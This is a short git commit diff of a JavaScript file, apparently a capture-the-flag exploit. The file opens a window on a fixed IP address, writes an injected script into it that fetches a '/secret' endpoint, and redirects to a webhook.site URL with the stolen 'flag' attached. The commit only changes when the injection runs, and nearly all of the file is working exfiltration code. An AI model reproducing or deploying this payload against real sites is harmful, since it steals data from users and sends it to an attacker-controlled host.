9f2aad876e6ac27010b1e39d69ca196ca142c584
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-16 20:31:41 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,2 +1,4 @@
 let value = window.open('http://20.235.243.131:8443/secret');
-value.document.write('<script>fetch("http://20.235.243.131:8443/secret").then(data => data.text()).then(flag => {window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag})</script>');
+value.window.onload=()=>{
+    value.document.write('<script>fetch("http://20.235.243.131:8443/secret").then(data => data.text()).then(flag => {window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag})</script>');
+}
